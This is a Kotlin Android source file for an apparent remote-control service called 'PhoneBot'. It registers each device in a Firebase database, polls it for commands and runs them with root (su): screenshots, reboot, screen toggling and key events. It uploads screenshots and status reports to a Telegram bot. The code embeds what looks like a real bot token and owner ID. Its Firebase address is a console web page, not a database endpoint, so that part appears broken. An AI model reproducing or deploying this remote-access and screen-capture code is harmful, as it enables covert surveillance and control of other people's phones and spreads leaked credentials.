package com.phonebot

import android.app.*
import android.content.Intent
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.*
import android.widget.Toast
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class BotService : Service() {

    companion object {
        const val BOT_TOKEN = "9034464426:AAFTRjcAybWTnFjUXeDSbqPOa80iZC56Zf4"
        const val OWNER_ID  = 9237838875L
        const val FB_BASE   = "https://console.firebase.google.com/project/ratka-d446a/database/ratka-d446a-default-rtdb/data/~2F/666b05c91014455dac0ffbae59b07444"
        const val CH        = "phonebot"
    }

    private var alive = false
    private val ui    = Handler(Looper.getMainLooper())
    private var mp: MediaPlayer? = null
    private val playlist = mutableListOf<Pair<File, String>>()
    private var idx = -1
    private lateinit var devId: String

    private val http = OkHttpClient.Builder()
        .readTimeout(35, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .build()

    override fun onBind(i: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(NotificationChannel(CH, "PhoneBot",
                NotificationManager.IMPORTANCE_LOW))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, notif("Работает…"))
        devId = Config.getDevId(this)
        if (!alive) { alive = true; Thread(::loop).start() }
        return START_STICKY
    }

    override fun onDestroy() { alive = false; mp?.release(); super.onDestroy() }

    // ── Основной цикл ──────────────────────────────────────────────
    private fun loop() {
        // Регистрация устройства
        val name = "${Build.MANUFACTURER} ${Build.MODEL}"
        val info = JSONObject().apply {
            put("name",  name)
            put("model", Build.MODEL)
            put("ts",    System.currentTimeMillis())
        }
        fbPut("devices/$devId", info)
        if (Config.isFirstRun(this)) {
            Config.markStarted(this)
            tgMsg(OWNER_ID, "📱 Новое устройство подключилось!\nУстройство: $name\nID: $devId")
        }

        while (alive) {
            try {
                // Пинг каждые 3 сек
                fbPatch("devices/$devId/ts", System.currentTimeMillis())

                // Команда из Firebase?
                val cmd = fbGet("commands/$devId")
                if (cmd != null) {
                    fbDel("commands/$devId")
                    val c = cmd.optString("cmd", "")
                    if (c.isNotEmpty()) exec(c)
                }
            } catch (e: Exception) { e.printStackTrace() }
            sleep(3000)
        }
    }

    // ── Выполнение команд ──────────────────────────────────────────
    private fun exec(cmd: String) = when {
        cmd == "screenshot"           -> Thread { screenshot() }.start()
        cmd == "playpause"            -> playPause()
        cmd == "next"                 -> nextTrack()
        cmd == "prev"                 -> prevTrack()
        cmd == "stop_music"           -> stopMusic()
        cmd == "vol_up"               -> vol(+2)
        cmd == "vol_down"             -> vol(-2)
        cmd == "mute"                 -> mute()
        cmd == "screen_off"           -> Thread { rootKey(223, "🌙 Экран выключен") }.start()
        cmd == "screen_on"            -> Thread { rootKey(224, "☀️ Экран включён") }.start()
        cmd == "do_reboot"            -> Thread { tgMsg(OWNER_ID, "🔄 Перезагружаю…"); root("reboot") }.start()
        cmd.startsWith("show_text:")  -> showText(cmd.removePrefix("show_text:"))
        else -> {}
    }

    // ── Скриншот ───────────────────────────────────────────────────
    private fun screenshot() {
        val f = File(getExternalFilesDir(null), "shot.png")
        root("screencap -p ${f.absolutePath}")
        sleep(600)
        if (f.exists() && f.length() > 1000) tgPhoto(OWNER_ID, f)
        else tgMsg(OWNER_ID, "Не получилось. Нет root-доступа?")
    }

    // ── Текст на экран ─────────────────────────────────────────────
    private fun showText(text: String) {
        ui.post { Toast.makeText(applicationContext, text, Toast.LENGTH_LONG).show() }
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(2, NotificationCompat.Builder(this, CH)
            .setSmallIcon(R.drawable.ic_notif)
            .setContentTitle("Сообщение").setContentText(text)
            .setStyle(NotificationCompat.BigTextStyle().bigText(text))
            .setPriority(NotificationCompat.PRIORITY_MAX).setAutoCancel(true).build())
        tgMsg(OWNER_ID, "✅ Текст показан")
    }

    // ── Громкость ──────────────────────────────────────────────────
    private fun vol(delta: Int) {
        val am  = getSystemService(AUDIO_SERVICE) as AudioManager
        val cur = am.getStreamVolume(AudioManager.STREAM_MUSIC)
        val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        val nv  = (cur + delta).coerceIn(0, max)
        am.setStreamVolume(AudioManager.STREAM_MUSIC, nv, 0)
        tgMsg(OWNER_ID, "${if (delta > 0) "🔊" else "🔉"} Громкость: $nv/$max")
    }

    private fun mute() {
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        if (am.getStreamVolume(AudioManager.STREAM_MUSIC) > 0) {
            am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0)
            tgMsg(OWNER_ID, "🔇 Звук выключен")
        } else {
            am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0)
            tgMsg(OWNER_ID, "🔊 Звук включён")
        }
    }

    // ── Root ───────────────────────────────────────────────────────
    private fun root(cmd: String): String = try {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
        val o = p.inputStream.bufferedReader().readText(); p.waitFor(); o
    } catch (e: Exception) { "" }

    private fun rootKey(code: Int, reply: String) {
        root("input keyevent $code"); tgMsg(OWNER_ID, reply)
    }

    // ── Музыка ─────────────────────────────────────────────────────
    private fun playIdx(i: Int) {
        if (i < 0 || i >= playlist.size) return
        idx = i
        val (file, title) = playlist[i]
        ui.post {
            try {
                mp?.release()
                mp = MediaPlayer().apply {
                    setAudioAttributes(AudioAttributes.Builder()
                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                        .setUsage(AudioAttributes.USAGE_MEDIA).build())
                    setDataSource(file.absolutePath)
                    prepare(); start()
                    setOnCompletionListener { if (idx + 1 < playlist.size) playIdx(idx + 1) }
                }
                Thread { tgMsg(OWNER_ID, "🎵 Играет: $title (${i + 1}/${playlist.size})") }.start()
            } catch (e: Exception) {
                Thread { tgMsg(OWNER_ID, "Ошибка: ${e.message}") }.start()
            }
        }
    }

    private fun playPause() {
        val p = mp
        if (p != null) {
            if (p.isPlaying) { p.pause(); tgMsg(OWNER_ID, "⏸ Пауза") }
            else { p.start(); tgMsg(OWNER_ID, "▶️ Продолжаю") }
        } else {
            Thread { root("input keyevent 85"); tgMsg(OWNER_ID, "⏯ Плей/Пауза") }.start()
        }
    }

    private fun nextTrack() {
        if (playlist.isNotEmpty()) playIdx((idx + 1) % playlist.size)
        else Thread { root("input keyevent 87"); tgMsg(OWNER_ID, "⏭ Следующий") }.start()
    }

    private fun prevTrack() {
        if (playlist.isNotEmpty()) playIdx(if (idx > 0) idx - 1 else 0)
        else Thread { root("input keyevent 88"); tgMsg(OWNER_ID, "⏮ Предыдущий") }.start()
    }

    private fun stopMusic() {
        mp?.stop(); mp?.release(); mp = null
        tgMsg(OWNER_ID, "⏹ Остановлено")
    }

    // ── Firebase REST ──────────────────────────────────────────────
    private fun fbGet(path: String): JSONObject? = try {
        val r = http.newCall(Request.Builder().url("$FB_BASE/$path.json").build()).execute()
        val b = r.body?.string() ?: return null
        if (b == "null" || b.isBlank()) null else JSONObject(b)
    } catch (e: Exception) { null }

    private fun fbPut(path: String, data: JSONObject) {
        try {
            http.newCall(Request.Builder().url("$FB_BASE/$path.json")
                .put(data.toString().toRequestBody("application/json".toMediaType())).build()).execute()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun fbDel(path: String) {
        try {
            http.newCall(Request.Builder().url("$FB_BASE/$path.json").delete().build()).execute()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun fbPatch(path: String, value: Any) {
        try {
            val parts = path.split("/")
            val parent = parts.dropLast(1).joinToString("/")
            val key    = parts.last()
            http.newCall(Request.Builder().url("$FB_BASE/$parent.json")
                .method("PATCH", JSONObject().put(key, value).toString()
                    .toRequestBody("application/json".toMediaType())).build()).execute()
        } catch (e: Exception) { e.printStackTrace() }
    }

    // ── Telegram ───────────────────────────────────────────────────
    private fun tgMsg(chatId: Long, text: String) {
        Thread {
            try {
                http.newCall(Request.Builder()
                    .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                    .post(JSONObject().apply { put("chat_id", chatId); put("text", text) }
                        .toString().toRequestBody("application/json".toMediaType())).build()).execute()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    private fun tgPhoto(chatId: Long, file: File) {
        try {
            http.newCall(Request.Builder()
                .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
                .post(MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId.toString())
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaType()))
                    .build()).build()).execute()
        } catch (e: Exception) { tgMsg(chatId, "Ошибка отправки фото") }
    }

    private fun notif(text: String) = NotificationCompat.Builder(this, CH)
        .setSmallIcon(R.drawable.ic_notif)
        .setContentTitle("PhoneBot").setContentText(text)
        .setPriority(NotificationCompat.PRIORITY_LOW).setOngoing(true).build()

    private fun sleep(ms: Long) = Thread.sleep(ms)
}
